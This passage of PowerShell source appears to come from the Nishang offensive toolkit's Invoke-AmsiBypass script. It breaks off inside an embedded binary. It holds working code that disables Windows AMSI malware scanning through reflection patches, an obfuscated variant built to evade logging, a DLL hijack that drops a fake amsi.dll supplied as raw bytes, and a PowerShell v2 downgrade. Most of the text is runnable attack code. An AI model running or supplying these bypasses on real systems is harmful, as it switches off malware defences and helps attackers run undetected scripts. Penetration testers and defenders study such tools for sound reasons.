}\n            else\n            {\n                Write-Output \"Executing the bypass.\"\n                [Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)\n            }\n        }\n\n        \"unloadobfuscated\"\n        {\n            Write-Verbose \"Using Matt Graeber's Reflection method with obfuscation from Daneil Bohannon's Invoke-Obfuscation - which bypasses WMF5 autologging.\"\n            if ($ShowOnly -eq $True)\n            {\n                $code = @\" \nSv  ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])\n\"@\n                Write-Output \"Use the following scriptblock before you run a script which gets detected.\"\n                Write-Output $code\n            }\n            else\n            {\n                Write-Output \"Executing the bypass.\"\n                Sv  ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])\n\n            }\n        }\n\n        \"unload2\"\n        {\n            Write-Verbose \"Using Matt Graeber's second Reflection method.\"\n            if ($ShowOnly -eq $True)\n            {\n                Write-Output \"Use the following scriptblock before you run a script which gets detected.\"\n                Write-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)'\n            }\n            else\n            {\n                Write-Output \"Executing the bypass.\"\n                [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)\n            }\n        }\n\n        \"dllhijack\"\n        {\n            Write-Verbose \"Using Cornelis de Plaa's DLL hijack method.\"\n            if ($ShowOnly -eq $True)\n            {\n                Write-Output \"Copy powershell.exe from C:\\Windows\\System32\\WindowsPowershell\\v1.0 to a local folder and dropa fake amsi.dll in the same directory.\"\n                Write-Output \"Run the new powershell.exe and AMSI should be gone for that session.\"\n            }\n            else\n            {\n                [Byte[]] $temp = $DllBytes -split ' '                \n                Write-Output \"Executing the bypass.\"\n                Write-Verbose \"Dropping the fake amsi.dll to disk.\"\n                [System.IO.File]::WriteAllBytes(\"$pwd\\amsi.dll\", $temp)\n\n                Write-Verbose \"Copying powershell.exe to the current working directory.\"\n                Copy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd\n\n                Write-Verbose \"Starting powershell.exe from the current working directory.\"\n                &amp; \"$pwd\\powershell.exe\"\n\n            }\n        }\n\n        \"psv2\"\n        {\n            Write-Verbose \"Using PowerShell version 2 which doesn't support AMSI.\"\n            if ($ShowOnly -eq $True)\n            {\n                Write-Output \"If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\"\n            }\n            else\n            {\n                Write-Verbose \"Checking if .Net version 2.0.50727 is installed.\"\n                $versions = Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\\p{L}'} | Select -ExpandProperty Version\n                if($versions -match \"2.0.50727\")\n                {\n                    Write-Verbose \".Net version 2.0.50727 found.\"\n                    Write-Output \"Executing the bypass.\"\n                    powershell.exe -version 2\n                }\n                else\n                {\n                    Write-Verbose \".Net version 2.0.50727 not found. Can't start PowerShell v2.\"\n                }\n            }\n        }\n\n        \"obfuscation\"\n        {\n            Write-Output \"AMSI and the AVs which support it can be bypassed using obfuscation techqniues.\"\n            Write-Output \"ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation).\"\n        }\n    }\n\n}\n\nfunction Invoke-AmsiBypass\n{\n&lt;#\n.SYNOPSIS\nNishang script which uses publicly known methods to bypass/avoid AMSI.\n\n.DESCRIPTION\nThis script implements publicly known methods bypass or avoid AMSI on Windows machines.\n\nAMSI is a script malware detection mechanism enabled by default in Windows 10. \n(https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx)\n\nThis script implements 6 methods of bypassing AMSI.\nunload - Method by Matt Graeber. Unloads AMSI from current PowerShell session.\nunload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session.\nunloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging.\nunloadobfuscated - 'unload' method above obfuscated with Daneil Bohannon's Invoke-Obfuscation - which avoids WMF5 autologging. \ndllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) \npsv2 - If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn't support AMSI.\n\nThe script also provides information on tools which can be used for obfuscation:\nISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/)\nInvoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)\n\n.PARAMETER Method\nThe method to be used for elevation. Defaut one is unloadsilent.\n\n.PARAMETER ShowOnly\nThe bypass is not executed. Just shown to the user. \n\n.EXAMPLE\nPS &gt; Invoke-AmsiBypass -Verbose\nAbove command runs the unloadsilent method.\n\n.EXAMPLE\nPS &gt; Invoke-PsUACme -Method unloadobfuscated -Verbose\nAbove command runs the unloadobfuscated method.\n\n.LINK\nhttp://www.labofapenetrationtester.com/2016/09/amsi.html\nhttps://github.com/samratashok/nishang\n#&gt;\n\n\n    [CmdletBinding()] Param(\n\n        [Parameter(Position = 0, Mandatory = $False)]\n        [ValidateSet(\"unload\",\"unloadsilent\",\"unloadobfuscated\",\"unload2\",\"dllhijack\",\"psv2\",\"obfuscation\")]\n        [String]\n        $Method = \"unloadsilent\",\n\n        [Parameter(Position = 1, Mandatory = $False)]\n        [Switch]\n        $ShowOnly\n    )\n\n    $AmsiX86 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 190 171 71 149 250 202 41 198 250 202 41 198 250 202 41 198 243 178 186 198 248 202 41 198 148 145 40 199 249 202 41 198 148 145 42 199 251 202 41 198 148 145 44 199 242 202 41 198 148 145 45 199 241 202 41 198 39 53 226 198 248 202 41 198 250 202 40 198 231 202 41 198 40 145 33 199 251 202 41 198 40 145 214 198 251 202 41 198 40 145 43 199 251 202 41 198 82 105 99 104 250 202 41 198 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 6 0 144 29 62 87 0 0 0 0 0 0 0 0 224 0 2 33 11 1 14 0 0 14 0 0 0 18 0 0 0 0 0 0 43 19 0 0 0 16 0 0 0 32 0 0 0 0 0 16 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 112 0 0 0 4 0 0 0 0 0 0 2 0 64 1 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 148 36 0 0 80 0 0 0 0 80 0 0 224 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 44 1 0 0 176 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 33 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 124 12 0 0 0 16 0 0 0 14 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 220 7 0 0 0 32 0 0 0 8 0 0 0 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 136 3 0 0 0 48 0 0 0 2 0 0 0 26 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 103 102 105 100 115 0 0 20 0 0 0 0 64 0 0 0 2 0 0 0 28 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 80 0 0 0 2 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 44 1 0 0 0 96 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 194 12 0 59 13 4 48 0 16 242 117 2 242 195 242 233 96 3 0 0 85 139 236 139 69 12 131 232 0 116 51 131 232 1 116 32 131 232 1 116 17 131 232 1 116 5 51 192 64 235 48 232 245 4 0 0 235 5 232 207 4 0 0 15 182 192 235 31 255 117 16 255 117 8 232 24 0 0 0 89 235 16 131 125 16 0 15 149 192 15 182 192 80 232 23 1 0 0 89 93 194 12 0 106 16 104 24 36 0 16 232 123 9 0 0 106 0 232 35 5 0 0 89 132 192 117 7 51 192 233 224 0 0 0 232 40 4 0 0 136 69 227 179 1 136 93 231 131 101 252 0 131 61 60 51 0 16 0 116 7 106 7 232 203 7 0 0 199 5 60 51 0 16 1 0 0 0 232 74 4 0 0 132 192 116 101 232 206 8 0 0 104 186 25 0 16 232 177 6 0 0 232 93 7 0 0 199 4 36 57 24 0 16 232 160 6 0 0 232 112 7 0 0 199 4 36 128 32 0 16 104 124 32 0 16 232 78 11 0 0 89 89 133 192 117 41 232 237 3 0 0 132 192 116 32 104 120 32 0 16 104 116 32 0 16 232 42 11 0 0 89 89 199 5 60 51 0 16 2 0 0 0 50 219 136 93 231 199 69 252 254 255 255 255 232 68 0 0 0 132 219 15 133 76 255 255 255 232 52 7 0 0 139 240 131 62 0 116 30 86 232 40 5 0 0 89 132 192 116 19 255 117 12 106 2 255 117 8 139 54 139 206 232 136 8 0 0 255 214 255 5 24 48 0 16 51 192 64 232 201 8 0 0 195 138 93 231 255 117 227 232 131 5 0 0 89 195 106 12 104 56 36 0 16 232 105 8 0 0 161 24 48 0 16 133 192 127 4 51 192 235 79 72 163 24 48 0 16 232 22 3 0 0 136 69 228 131 101 252 0 131 61 60 51 0 16 2 116 7 106 7 232 190 6 0 0 232 180 3 0 0 131 37 60 51 0 16 0 199 69 252 254 255 255 255 232 27 0 0 0 106 0 255 117 8 232 65 5 0 0 89 89 51 201 132 192 15 149 193 139 193 232 78 8 0 0 195 232 164 3 0 0 255 117 228 232 6 5 0 0 89 195 106 12 104 88 36 0 16 232 236 7 0 0 131 101 252 0 139 125 12 131 255 1 116 10 131 255 2 116 5 139 93 8 235 49 255 117 16 87 139 93 8 83 232 218 0 0 0 139 240 137 117 228 133 246 15 132 190 0 0 0 255 117 16 87 83 232 216 253 255 255 139 240 137 117 228 133 246 15 132 167 0 0 0 131 255 1 117 7 83 232 198 9 0 0 89 255 117 16 87 83 232 159 253 255 255 139 240 137 117 228 131 255 1 117 43 133 246 117 30 255 117 16 80 83 232 135 253 255 255 255 117 16 86 83 232 147 253 255 255 255 117 16 86 83 232 116 0 0 0 131 255 1 117 4 133 246 116 4 133 255 117 11 83 232 130 9 0 0 89 133 255 116 5 131 255 3 117 72 255 117 16 87 83 232 98 253 255 255 139 240 137 117 228 133 246 116 53 255 117 16 87 83 232 58 0 0 0 139 240 235 36 139 77 236 139 1 81 255 48 104 22 16 0 16 255 117 16 255 117 12 255 117 8 232 86 2 0 0 131 196 24 195 139 101 232 51 246 137 117 228 199 69 252 254 255 255 255 139 198 232 54 7 0 0 195 85 139 236 86 139 53 160 32 0 16 133 246 117 5 51 192 64 235 18 255 117 16 139 206 255 117 12 255 117 8 232 193 6 0 0 255 214 94 93 194 12 0 85 139 236 131 125 12 1 117 5 232 88 4 0 0 255 117 16 255 117 12 255 117 8 232 177 254 255 255 131 196 12 93 194 12 0 85 139 236 106 0 255 21 40 32 0 16 255 117 8 255 21 0 32 0 16 104 9 4 0 192 255 21 4 32 0 16 80 255 21 8 32 0 16 93 195 85 139 236 129 236 36 3 0 0 106 23 232 234 8 0 0 133 192 116 5 106 2 89 205 41 163 32 49 0 16 137 13 28 49 0 16 137 21 24 49 0 16 137 29 20 49 0 16 137 53 16 49 0 16 137 61 12 49 0 16 102 140 21 56 49 0 16 102 140 13 44 49 0 16 102 140 29 8 49 0 16 102 140 5 4 49 0 16 102 140 37 0 49 0 16 102 140 45 252 48 0 16 156 143 5 48 49 0 16 139 69 0 163 36 49 0 16 139 69 4 163 40 49 0 16 141 69 8 163 52 49 0 16 139 133 220 252 255 255 199 5 112 48 0 16 1 0 1 0 161 40 49 0 16 163 44 48 0 16 199 5 32 48 0 16 9 4 0 192 199 5 36 48 0 16 1 0 0 0 199 5 48 48 0 16 1 0 0 0 106 4 88 107 192 0 199 128 52 48 0 16 2 0 0 0 106 4 88 107 192 0 139 13 4 48 0 16 137 76 5 248 106 4 88 193 224 0 139 13 0 48 0 16 137 76 5 248 104 164 32 0 16 232 225 254 255 255 139 229 93 195 85 139 236 139 69 8 86 139 72 60 3 200 15 183 65 20 141 81 24 3 208 15 183 65 6 107 240 40 3 242 59 214 116 25 139 77 12 59 74 12 114 10 139 66 8 3 66 12 59 200 114 12 131 194 40 59 214 117 234 51 192 94 93 195 139 194 235 249 232 85 7 0 0 133 192 117 3 50 192 195 100 161 24 0 0 0 86 190 64 51 0 16 139 80 4 235 4 59 208 116 16 51 192 139 202 240 15 177 14 133 192 117 240 50 192 94 195 176 1 94 195 232 32 7 0 0 133 192 116 7 232 118 5 0 0 235 5 232 77 7 0 0 176 1 195 106 0 232 207 0 0 0 132 192 89 15 149 192 195 232 97 7 0 0 132 192 117 3 50 192 195 232 85 7 0 0 132 192 117 7 232 76 7 0 0 235 237 176 1 195 232 66 7 0 0 232 61 7 0 0 176 1 195 85 139 236 232 203 6 0 0 133 192 117 24 131 125 12 1 117 18 255 117 16 139 77 20 80 255 117 8 232 136 4 0 0 255 85 20 255 117 28 255 117 24 232 219 6 0 0 89 89 93 195 232 155 6 0 0 133 192 116 12 104 68 51 0 16 232 220 6 0 0 89 195 232 240 6 0 0 133 192 15 132 217 6 0 0 195 106 0 232 221 6 0 0 89 233 215 6 0 0 85 139 236 131 125 8 0 117 7 198 5 92 51 0 16 1 232 186 4 0 0 232 189 6 0 0 132 192 117 4 50 192 93 195 232 176 6 0 0 132 192 117 10 106 0 232 165 6 0 0 89 235 233 176 1 93 195 85 139 236 131 236 12 86 139 117 8 133 246 116 5 131 254 1 117 124 232 31 6 0 0 133 192 116 42 133 246 117 38 104 68 51 0 16 232 80 6 0 0 89 133 192 116 4 50 192 235 87 104 80 51 0 16 232 61 6 0 0 247 216 89 26 192 254 192 235 68 161 4 48 0 16 141 117 244 87 131 224 31 191 68 51 0 16 106 32 89 43 200 131 200 255 211 200 51 5 4 48 0 16 137 69 244 137 69 248 137 69 252 165 165 165 191 80 51 0 16 137 69 244 137 69 248 141 117 244 137 69 252 176 1 165 165 165 95 94 139 229 93 195 106 5 232 6 2 0 0 204 106 8 104 120 36 0 16 232 117 3 0 0 131 101 252 0 184 77 90 0 0 102 57 5 0 0 0 16 117 96 161 60 0 0 16 129 184 0 0 0 16 80 69 0 0 117 79 185 11 1 0 0 102 57 136 24 0 0 16 117 65 139 69 8 185 0 0 0 16 43 193 80 81 232 180 253 255 255 89 89 133 192 116 42 247 64 36 0 0 0 128 117 33 199 69 252 254 255 255 255 176 1 235 31 139 69 236 139 0 51 201 129 56 5 0 0 192 15 148 193 139 193 195 139 101 232 199 69 252 254 255 255 255 50 192 232 59 3 0 0 195 85 139 236 232 11 5 0 0 133 192 116 15 128 125 8 0 117 9 51 192 185 64 51 0 16 135 1 93 195 85 139 236 128 61 92 51 0 16 0 116 6 128 125 12 0 117 18 255 117 8 232 67 5 0 0 255 117 8 232 59 5 0 0 89 89 176 1 93 195 85 139 236 161 4 48 0 16 139 200 51 5 68 51 0 16 131 225 31 255 117 8 211 200 131 248 255 117 7 232 1 5 0 0 235 11 104 68 51 0 16 232 233 4 0 0 89 247 216 89 27 192 247 208 35 69 8 93 195 85 139 236 255 117 8 232 186 255 255 255 247 216 89 27 192 247 216 72 93 195 85 139 236 131 236 20 131 101 244 0 131 101 248 0 161 4 48 0 16 86 87 191 78 230 64 187 190 0 0 255 255 59 199 116 13 133 198 116 9 247 208 163 0 48 0 16 235 102 141 69 244 80 255 21 28 32 0 16 139 69 248 51 69 244 137 69 252 255 21 32 32 0 16 49 69 252 255 21 36 32 0 16 49 69 252 141 69 236 80 255 21 16 32 0 16 139 77 240 141 69 252 51 77 236 51 77 252 51 200 59 207 117 7 185 79 230 64 187 235 16 133 206 117 12 139 193 13 17 71 0 0 193 224 16 11 200 137 13 4 48 0 16 247 209 137 13 0 48 0 16 95 94 139 229 93 195 104 96 51 0 16 255 21 24 32 0 16 195 104 96 51 0 16 232 229 3 0 0 89 195 184 104 51 0 16 195 184 112 51 0 16 195 232 239 255 255 255 139 72 4 131 8 4 137 72 4 232 231 255 255 255 139 72 4 131 8 2 137 72 4 195 184 132 51 0 16 195 85 139 236 129 236 36 3 0 0 83 86 106 23 232 234 3 0 0 133 192 116 5 139 77 8 205 41 51 246 141 133 220 252 255 255 104 204 2 0 0 86 80 137 53 120 51 0 16 232 133 3 0 0 131 196 12 137 133 140 253 255 255 137 141 136 253 255 255 137 149 132 253 255 255 137 157 128 253 255 255 137 181 124 253 255 255 137 189 120 253 255 255 102 140 149 164 253 255 255 102 140 141 152 253 255 255 102 140 157 116 253 255 255 102 140 133 112 253 255 255 102 140 165 108 253 255 255 102 140 173 104 253 255 255 156 143 133 156 253 255 255 139 69 4 137 133 148 253 255 255 141 69 4 137 133 160 253 255 255 199 133 220 252 255 255 1 0 1 0 139 64 252 106 80 137 133 144 253 255 255 141 69 168 86 80 232 252 2 0 0 139 69 4 131 196 12 199 69 168 21 0 0 64 199 69 172 1 0 0 0 137 69 180 255 21 20 32 0 16 86 141 88 255 247 219 141 69 168 137 69 248 141 133 220 252 255 255 26 219 137 69 252 254 195 255 21 40 32 0 16 141 69 248 80 255 21 0 32 0 16 133 192 117 13 15 182 195 247 216 27 192 33 5 120 51 0 16 94 91 139 229 93 195 83 86 190 8 36 0 16 187 8 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 56 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 83 86 190 16 36 0 16 187 16 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 13 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 255 37 112 32 0 16 204 204 204 204 204 104 75 26 0 16 100 255 53 0 0 0 0 139 68 36 16 137 108 36 16 141 108 36 16 43 224 83 86 87 161 4 48 0 16 49 69 252 51 197 80 137 101 232 255 117 248 139 69 252 199 69 252 254 255 255 255 137 69 248 141 69 240 100 163 0 0 0 0 242 195 139 77 240 100 137 13 0 0 0 0 89 95 95 94 91 139 229 93 81 242 195 85 139 236 255 117 20 255 117 16 255 117 12 255 117 8 104 5 16 0 16 104 4 48 0 16 232 203 1 0 0 131 196 24 93 195 85 139 236 131 37 124 51 0 16 0 131 236 44 83 51 219 67 9 29 16 48 0 16 106 10 232 228 1 0 0 133 192 15 132 116 1 0 0 131 101 236 0 51 192 131 13 16 48 0 16 2 51 201 86 87 137 29 124 51 0 16 141 125 212 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 139 69 212 139 77 224 137 69 244 129 241 105 110 101 73 139 69 220 53 110 116 101 108 11 200 139 69 216 53 71 101 110 117 11 200 247 217 106 1 88 26 201 106 0 128 193 1 89 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 116 67 139 69 212 37 240 63 255 15 61 192 6 1 0 116 35 61 96 6 2 0 116 28 61 112 6 2 0 116 21 61 80 6 3 0 116 14 61 96 6 3 0 116 7 61 112 6 3 0 117 17 139 61 128 51 0 16 131 207 1 137 61 128 51 0 16 235 6 139 61 128 51 0 16 131 125 244 7 139 69 224 137 69 228 139 69 220 137 69 248 137 69 232 124 50 106 7 88 51 201 83 15 162 139 243 91 141 93 212 137 3 137 115 4 137 75 8 137 83 12 139 69 216 169 0 2 0 0 137 69 236 139 69 248 116 9 131 207 2 137 61 128 51 0 16 95 94 169 0 0 16 0 116 109 131 13 16 48 0 16 4 199 5 124 51 0 16 2 0 0 0 169 0 0 0 8 116 85 169 0 0 0 16 116 78 51 201 15 1 208 137 69 240 137 85 244 139 69 240 139 77 244 131 224 6 51 201 131 248 6 117 51 133 201 117 47 161 16 48 0 16 131 200 8 199 5 124 51 0 16 3 0 0 0 246 69 236 32 163 16 48 0 16 116 18 131 200 32 199 5 124 51 0 16 5 0 0 0 163 16 48 0 16 51 192 91 139 229 93 195 51 192 57 5 20 48 0 16 15 149 192 195 195 255 37 52 32 0 16 255 37 60 32 0 16 255 37 56 32 0 16 255 37 48 32 0 16 255 37 64 32 0 16 255 37 104 32 0 16 255 37 100 32 0 16 255 37 96 32 0 16 255 37 92 32 0 16 255 37 88 32 0 16 255 37 84 32 0 16 255 37 80 32 0 16 255 37 76 32 0 16 255 37 72 32 0 16 255 37 12 32 0 16 176 1 195 51 192 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 27 28 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 48 0 16 112 48 0 16 0 0 0 0 0 0 0 0 144 29 62 87 0 0 0 0 2 0 0 0 61 0 0 0 132 33 0 0 132 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 196 33 0 0 196 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 13 0 0 0 44 2 0 0 216 33 0 0 216 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 48 0 16 128 33 0 16 1 0 0 0 112 32 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 75 26 0 0 82 83 68 83 69 10 117 219 0 114 41 77 133 149 98 78 29 103 122 248 7 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 20 0 0 0 20 0 0 0 1 0 0 0 19 0 0 0 71 67 84 76 0 16 0 0 124 12 0 0 46 116 101 120 116 36 109 110 0 0 0 0 0 32 0 0 112 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 112 32 0 0 4 0 0 0 46 48 48 99 102 103 0 0 116 32 0 0 4 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 120 32 0 0 4 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 124 32 0 0 4 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 128 32 0 0 4 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 132 32 0 0 4 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 136 32 0 0 4 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 140 32 0 0 4 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 144 32 0 0 4 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 160 32 0 0 220 0 0 0 46 114 100 97 116 97 0 0 128 33 0 0 4 0 0 0 46 114 100 97 116 97 36 115 120 100 97 116 97 0 0 0 132 33 0 0 128 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 4 36 0 0 4 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 8 36 0 0 4 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 12 36 0 0 4 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 16 36 0 0 4 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 24 36 0 0 124 0 0 0 46 120 100 97 116 97 36 120 0 0 0 0 148 36 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 208 36 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 228 36 0 0 112 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 84 37 0 0 136 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 24 0 0 0 46 100 97 116 97 0 0 0 24 48 0 0 112 3 0 0 46 98 115 115 0 0 0 0 0 64 0 0 20 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 80 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 80 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 